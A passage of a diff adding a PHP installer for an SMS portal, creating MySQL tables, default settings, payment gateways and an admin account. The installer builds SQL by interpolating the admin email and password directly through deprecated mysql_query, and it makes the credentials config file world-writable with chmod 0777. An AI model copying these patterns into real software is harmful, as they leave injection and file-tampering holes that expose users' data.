+  `method` varchar(100) NOT NULL,
+  `status` varchar(20) NOT NULL DEFAULT 'Pending',
+  `reference` varchar(30) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `blacklist` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `date` date NOT NULL,
+  `phone` varchar(30) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `paymentgateways` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(200) NOT NULL,
+  `username` varchar(300) NOT NULL,
+  `alias` varchar(100) NOT NULL,
+  `status` int(11) NOT NULL DEFAULT '0',
+  `custom` int(11) NOT NULL DEFAULT '1',
+  `text` text NOT NULL,
+  `image` varchar(300) NOT NULL DEFAULT 'custom.png',
+  `url` varchar(300) NOT NULL,
+  `param1` varchar(300) NOT NULL,
+  `param2` varchar(500) NOT NULL,
+  `vat` varchar(300) NOT NULL,
+  `handling` varchar(500) NOT NULL,  
+  `processingFeeFixed` varchar(500) NOT NULL,
+  `processingFeePerc` varchar(500) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;";
+mysql_query($query);
+
+$query = "INSERT INTO `paymentgateways` (`id`, `name`, `username`, `alias`, `status`, `custom`, `text`, `image`, `url`, `param1`, `processingFeeFixed`, `processingFeePerc`) VALUES
+(1, 'Interswitch (MasterCard/Visa/Verve)', '', 'webpay', 0, 0, '', 'webpay.png', 'https://connect.interswitchng.com/documentation/getting-started/','','',''),
+(2, 'GTPay (MasterCard/Visa/Verve)', '', 'gtpay', 0, 0, '', 'gtpay.png', 'http://www.gtbank.com/gtpay','','',''),
+(3, 'SimplePay (MasterCard/Visa/Verve)', '', 'simplepay', 0, 0, '', 'simplepay.png', 'https://www.simplepay.ng','','',''),
+(4, 'PayPal (MasterCard/Visa)', '', 'paypal', 0, 0, '', 'paypal.png', 'https://www.paypal.com','','',''),
+(6, '2Checkout (MasterCard/Visa)', '', '2checkout', 0, 0, '', '2checkout.png', 'https://www.2checkout.com','','',''),
+(7, 'Quickteller (MasterCard/Visa)', '', 'quickteller', 0, 0, '', 'quickteller.png', 'https://connect.interswitchng.com/documentation/how-to-get-listed/','','',''),
+(8, 'VoguePay (MasterCard/Visa)', '', 'voguepay', 0, 0, '', 'voguepay.png', 'https://www.voguepay.com','','',''),
+(9, 'Stripe', '', 'stripe', 0, 0, '', 'stripe.png', 'https://www.stripe.com','','',''),
+(5, 'Custom Gateway', '', 'custom', 1, 1, 'Pay total invoice amount into our bank account. ', 'custom.png', '','','','');";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `phonebooks` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `title` varchar(100) NOT NULL,
+  `customer` int(11) NOT NULL,
+  `reseller` int(11) NOT NULL,
+  `description` varchar(300) NOT NULL,
+  `birthday_sms` varchar(500) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `accounts` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `date` varchar(100) NOT NULL,
+  `description` varchar(300) NOT NULL,
+  `income` varchar(100) NOT NULL,
+  `expense` varchar(100) NOT NULL,
+  `processed_by` varchar(300) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `marketinglist` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `title` varchar(100) NOT NULL,
+  `keyword` varchar(100) NOT NULL,
+  `customer` int(11) NOT NULL,
+  `description` varchar(300) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `marketingcontacts` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(50) NOT NULL DEFAULT 'No Name',
+  `phone` varchar(20) NOT NULL,
+  `marketinglist` int(11) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `phonebook_owners` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `phonebook` int(11) NOT NULL,
+  `customer` int(11) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `scheduledmessages` (
+  `message` text NOT NULL,
+  `senderID` varchar(15) NOT NULL,
+  `recipient` text NOT NULL,
+  `date` datetime NOT NULL,
+  `customer` int(11) NOT NULL,
+  `reseller` int(11) NOT NULL,
+  `pages` int(11) NOT NULL,
+  `is_unicode` int(11) NOT NULL DEFAULT '0',
+  `is_mms` int(11) NOT NULL DEFAULT '0',
+  `status` varchar(50) NOT NULL DEFAULT 'Pending',
+  `error` varchar(300) NOT NULL DEFAULT '',
+  `media` varchar(500) NOT NULL DEFAULT '',
+  `scheduleDate` datetime NOT NULL,
+  `IP` varchar(30) NOT NULL,
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `sentmessages` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `message` text NOT NULL,
+  `senderID` varchar(15) NOT NULL,
+  `recipient` text NOT NULL,
+  `date` datetime NOT NULL,
+  `customer` int(11) NOT NULL,
+  `reseller` int(11) NOT NULL,
+  `pages` int(11) NOT NULL,
+  `status` varchar(50) NOT NULL DEFAULT 'Sending',
+  `units` DECIMAL(11, 2) NOT NULL,
+  `sentFrom` varchar(50) NOT NULL DEFAULT 'Panel',
+  `is_mms` int(11) NOT NULL DEFAULT '0',
+  `is_unicode` int(11) NOT NULL DEFAULT '0',
+  `IP` varchar(20) NOT NULL DEFAULT 'Unknown',
+  `gateway_id` varchar(500) NOT NULL DEFAULT '',
+  `dlr` varchar(200) NOT NULL DEFAULT '',
+  `media` varchar(500) NOT NULL DEFAULT '',
+  `error` varchar(100) NOT NULL DEFAULT 'Message Status Not Available',
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `messagedetails` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `queue_id` int(11) NOT NULL,
+  `message` text NOT NULL,
+  `recipient` text NOT NULL,
+  `status` varchar(50) NOT NULL DEFAULT 'Sending',
+  `gateway` varchar(100) NOT NULL,
+  `country` varchar(100) NOT NULL,
+  `operator` varchar(100) NOT NULL DEFAULT 'Unknown',
+  `date` varchar(20) NOT NULL,
+  `sender` varchar(20) NOT NULL,
+  `units` DECIMAL(11, 2) NOT NULL,
+  `is_mms` int(11) NOT NULL DEFAULT '0',
+  `is_unicode` int(11) NOT NULL DEFAULT '0',
+  `error` varchar(200) NOT NULL DEFAULT 'Sent Successfully',
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `resellers` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `customer` int(11) NOT NULL,
+  `business_name` text NOT NULL,
+  `business_email` text NOT NULL,
+  `website` text NOT NULL,
+  `background_url`  text NOT NULL,
+  `logo_url` text NOT NULL,
+  `welcome_sms` text NOT NULL,
+  `welcome_email` text NOT NULL,
+  `welcome_email_subject` text NOT NULL,
+  `menu_colour` text NOT NULL,
+  `header_colour` text NOT NULL,
+  `menu_font` text NOT NULL,
+  `header_font` text NOT NULL,  
+  `allowed_domain` varchar(500) NOT NULL,
+  `default_timezone` varchar(500) NOT NULL,
+  `sms_sender` varchar(500) NOT NULL,
+  `test_units` varchar(500) NOT NULL,
+  `email_sender` varchar(500) NOT NULL,
+  `smtp_user` varchar(500) NOT NULL,
+  `smtp_password` varchar(500) NOT NULL,
+  `smtp_server` varchar(500) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `custom_rates` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `customer` int(11) NOT NULL,
+  `rates` text NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `settings` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `field` varchar(100) NOT NULL,
+  `value` text NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `field` (`field`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=35 ;";
+mysql_query($query);
+
+$query = "INSERT INTO `settings` (`id`, `field`, `value`) VALUES
+(1, 'siteBackground', 'background.jpg'),
+(2, 'backgroundColor', '#f8f8f8'),
+(3, 'headerColor', '#222222'),
+(4, 'footerColor', ''),
+(5, 'siteLogo', ''),
+(6, 'siteName', 'LifePost System MOhamedgpaly'),
+(7, 'forbiddenID', ''),
+(8, 'activeGateway', '1'),
+(9, 'smsCost', '1=1\r\n2=1\r\n22=1\r\n234=1'),
+(10, 'defaultCost', '1'),
+(11, 'defaultUnitCost', '1.00'),
+(12, 'resellerUnitCost', '1.00'),
+(13, 'companyName', ''),
+(14, 'companyAddress', ''),
+(15, 'companyEmail', ''),
+(16, 'companyPhone', ''),
+(17, 'defaultCurrency', '1'),
+(18, 'smsSender', 'SMS Centre'),
+(19, 'emailSender', 'SMS Customer Service'),
+(20, 'newAccountSMS', 'Hi [CUSTOMER NAME].\r\nYour SMS account has been created. Your username is [USERNAME] and your password is [PASSWORD].'),
+(21, 'newAccountEmail', '<p>Hi [CUSTOMER NAME].</p>\r\n\r\n<p><br />\r\nYour SMS account has been created.</p>\r\n\r\n<p>Your username is [USERNAME] and your password is [PASSWORD].</p>\r\n'),
+(22, 'newAccountEmailSubject', 'Welcome To Your New SMS Account'),
+(23, 'newPasswordEmailSubject', 'Your Password Has Been Recovered'),
+(24, 'newPasswordSMS', 'Hi [CUSTOMER NAME].\r\nYour login details has been recovered. Your username is [USERNAME] and your new password is [PASSWORD].'),
+(25, 'newPasswordEmail', '<p>Hi [CUSTOMER NAME].</p>\r\n\r\n<p><br />\r\nYour login details has been recovered.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Your username is [USERNAME] and your new password is [PASSWORD].</p>\r\n'),
+(26, 'testUnits', '5'),
+(27, 'defaultTimeZone', 'Europe/Paris'),
+(28, 'orderApproveSMS', 'Hi [CUSTOMER NAME].\r\nYour SMS account has been credited with [UNITS] SMS units. Your new balance is [BALANCE].'),
+(29, 'orderApproveEmail', '<p>Dear [CUSTOMER NAME].</p>\r\n\r\n<p><br />\r\nYour SMS account has been credited with [UNITS] SMS units.</p>\r\n\r\n<p>Your new balance is [BALANCE].</p>\r\n'),
+(30, 'orderApproveEmailSubject', 'Your Order for SMS Units Has Been Approved'),
+(31, 'newAdminPasswordEmailSubject', 'Your Fome SMS Portal Admin Password'),
+(32, 'newAdminPasswordEmail', '<p>Hi [CUSTOMER NAME],</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Your Fome SMS Portal Admin access details have been recovered. Here are your new login details:</p>\r\n\r\n<p><strong>Username: </strong>[USER NAME]</p>\r\n\r\n<p><strong>Password: </strong>[PASSWORD]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n'),
+(33, 'acompanyEmail', 'non-reply@fomesmsportal.com'),
+(34, 'term', ''),
+(35, 'menuColor', '#333333'),
+(36, 'fontColor', '#eeeeee'),
+(37, 'dynamicSender', '1'),
+(38, 'localEncode', '1'),
+(39, 'taxAmount', '0.00'),
+(40, 'vatAmount', '0.00'),
+(41, 'smppEnabled', '0'),
+(42, 'forbiddenCountry', ''),
+(43, 'menuFontColor', '#ffffff'),
+(44, 'companyWebsite', ''),
+(45, 'redirectToSite', '0'),
+(46, 'emailClient', 'php'),
+(47, 'smtpServer', ''),
+(48, 'smtpUsername', ''),
+(49, 'smtpPassword', ''),
+(50, 'unicodeSMS', '1'),
+(51, '2WaySMSEnabled', '1'),
+(52, 'MMSEnabled', '1'),
+(53, 'language', 'en'),
+(54, 'param', ''),
+(55, 'Customer2WaySMSEnabled', '1'),
+(56, 'activeUnicodeGateway', ''),
+(57, 'activeMMSGateway', ''),
+(58, 'defaultCountry', 'Nigeria'),
+(59, 'active2WaySMSGateway', ''),
+(60, 'headerFontColor', '#FFFFFF'),
+(61, 'phone_verify', '0'),
+(62, 'facebook_secrete', ''),
+(63, 'blackListKeyword', 'BLACKLIST ME'),
+(64, 'facebook_api', ''),
+(65, 'email_verify', '1'),
+(66, 'activeTheme', 'default'),
+(67, 'incomingXML', '0'),
+(68, 'incomingFrom', ''),
+(69, 'incomingTo', ''),
+(70, 'incomingBody', '');";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `smsprice` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `minValue` decimal(11,2) NOT NULL,
+  `maxValue` decimal(11,2) NOT NULL,
+  `cost` decimal(11,4) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `sender_id` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `customer` int(11) NOT NULL,
+  `reseller` int(11) NOT NULL DEFAULT '0',
+  `senderID` varchar(20) NOT NULL,
+  `approved` int(2) NOT NULL DEFAULT '0',
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;";
+mysql_query($query);
+
+$query = "INSERT INTO `smsprice` (`id`, `minValue`, `maxValue`, `cost`) VALUES
+(1, '0.00', '1000.00', '1.00'),
+(2, '1001.00', '5000.00', '1.00'),
+(3, '5001.00', '10000.00', '1.00');";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `tickets` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `customer` int(11) NOT NULL,
+  `from` int(11) NOT NULL,
+  `reseller` int(11) NOT NULL,
+  `subject` varchar(200) NOT NULL,
+  `message` text NOT NULL,
+  `date` datetime NOT NULL,
+  `status` varchar(50) NOT NULL,
+  `department` varchar(200) NOT NULL,
+  `adminstatus` int(11) NOT NULL DEFAULT '0',
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `resellertickets` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `customer` int(11) NOT NULL,
+  `sub_customer` int(11) NOT NULL,
+  `subject` varchar(200) NOT NULL,
+  `message` text NOT NULL,
+  `date` datetime NOT NULL,
+  `status` varchar(50) NOT NULL,
+  `department` varchar(200) NOT NULL,
+  `adminstatus` int(11) NOT NULL DEFAULT '0',
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `transactions` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `customer` int(11) NOT NULL,
+  `reseller` int(11) NOT NULL,
+  `units` decimal(11,2) NOT NULL,
+  `cost` decimal(11,4) NOT NULL,
+  `price` decimal(11,4) NOT NULL,
+  `date` datetime NOT NULL,
+  `status` varchar(100) NOT NULL,
+  `gateway` varchar(100) NOT NULL,
+  `approvedBy` varchar(200) NOT NULL,
+  `transaction_reference` varchar(400) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Holds details of all purchases on the panel' AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `transaction_status` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `value` varchar(100) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Definition of the various transaction status' AUTO_INCREMENT=5 ;";
+mysql_query($query);
+
+$query = "INSERT INTO `transaction_status` (`id`, `value`) VALUES
+(1, 'Pending'),
+(2, 'Pending'),
+(3, 'Completed'),
+(4, 'Failed');";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `users` (
+  `firstName` varchar(200) NOT NULL,
+  `lastName` varchar(200) NOT NULL,
+  `username` varchar(20) NOT NULL,
+  `password` varchar(100) NOT NULL,
+  `email` varchar(100) NOT NULL,
+  `lastLogin` datetime NOT NULL,
+  `lastIP` varchar(30) NOT NULL,
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `customer` int(11) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `vouchers` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `pin` varchar(20) NOT NULL,
+  `units` int(11) NOT NULL,
+  `cost` decimal(11,4) NOT NULL,
+  `used` int(11) NOT NULL DEFAULT '0',
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$query = "CREATE TABLE IF NOT EXISTS `themes` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(100) NOT NULL,
+  `alias` varchar(100) NOT NULL,
+  `author` varchar(100) NOT NULL,
+  `image` varchar(300) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
+mysql_query($query);
+
+$add = mysql_query("INSERT INTO themes (`id`, `name`, `alias`, `author`, `image`) 
+	VALUES (NULL, 'Sendroid Default', 'default', 'Ynet Interactive', '../themes/default/preview.png');");		
+
+//encript password 
+		$password2 = $pass;
+		$salt = genRandomPassword(32);
+		$crypt = getCryptedPassword($password2, $salt);
+		$pass = $crypt.':'.$salt;	
+
+$last_login_date = date('Y-m-d h:i:s');		
+//insert new adin details 
+		$add = mysql_query("INSERT INTO `users` (`firstName`, `lastName`, `username`, `password`, `email`, `lastLogin`, `lastIP`, `id`, `customer`) VALUES ('Supper Admin', '', 'admin', '$pass', '$email', '$last_login_date', '', 1, 1);");
+
+//add new customer for admin
+$query = "INSERT INTO `customers` (`id`, `name`, `email`, `phone`, `username`, `password`, `address`, `country`, `senderID`, `picture`, `timeZone`, `smsPurchase`, `smsBalance`, `smsBorrowed`, `isReseller`, `reseller`, `lastLogin`, `lastIP`, `phoneVerified`, `emailVerified`, `verificationCode`, `currency`, `creditLimit`, `suspended`) VALUES
+(1, 'Supper Admin', '$email', '', 'admin', '$pass', '', '', '', '', 'Europe/Paris', '5.00', '0.00', '0.00', 1, 0, '', '', 1, 1, 66546, 1, '0.00', 0);";
+mysql_query($query);
+
+//check if all went well 
+	if($res) {
+	$er = '';	
+	} else {
+	$res = 'Incomplete Database Setup';	
+	}
+//Update Config file
+$file_path = DOCUMENT_ROOT.'82335643564354858435/includes/72335823356466643548114531252654.php';
+$resultsd = @chmod($file_path, 0777);
+
+include($file_path);		
+$h = $sconfig['host'];
+$d = $sconfig['database'];
+$u = $sconfig['user'];
+$p = $sconfig['password'];
+$i = $sconfig['installed'];
+
+$data3 = read_file($file_path);
+$data3 = str_replace($h, $host, $data3);
+$data3 = str_replace($d, $database, $data3);
+$data3 = str_replace($u, $username, $data3);
+$data3 = str_replace($p, $password, $data3);
+$data3 = str_replace($i, 'INSTALLED', $data3);
+write_file($file_path, $data3);	
+
+if(empty($er)) {
+return true;	
+} else {
+return false;	
+}
+
+}
+
+?>
